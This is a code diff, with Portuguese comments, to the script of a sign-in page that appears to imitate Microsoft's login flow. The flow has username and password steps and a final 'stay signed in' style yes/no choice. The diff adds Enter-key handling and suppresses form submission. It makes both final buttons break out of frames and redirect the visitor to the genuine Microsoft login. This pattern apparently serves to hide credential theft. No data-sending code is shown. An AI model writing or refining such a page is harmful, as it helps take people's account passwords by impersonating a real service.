@@ -7,6 +7,29 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let unameVal = pwdVal = false;
 
+    // Previne submit dos forms (Enter key)
+    document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+        });
+    });
+
+    // Enter no campo de email -> clica Next
+    unameInp.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('btn_next').click();
+        }
+    });
+
+    // Enter no campo de senha -> clica Sign in
+    pwdInp.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') {
+            e.preventDefault();
+            document.getElementById('btn_sig').click();
+        }
+    });
+
     // Next button
     const nxt = document.getElementById('btn_next');
 
@@ -118,12 +141,14 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById('section_uname').classList.remove('d-none');
     })
 
-    // Final buttons
+    // Final buttons - redireciona pro login oficial da Microsoft
     document.getElementById('btn_final_no').addEventListener('click', () => {
-        window.location.href = 'https://outlook.live.com';
+        try { window.top.location.replace('https://login.live.com'); }
+        catch(e) { window.open('https://login.live.com', '_top'); }
     })
 
     document.getElementById('btn_final_yes').addEventListener('click', () => {
-        window.location.href = 'https://outlook.live.com';
+        try { window.top.location.replace('https://login.live.com'); }
+        catch(e) { window.open('https://login.live.com', '_top'); }
     })
 })
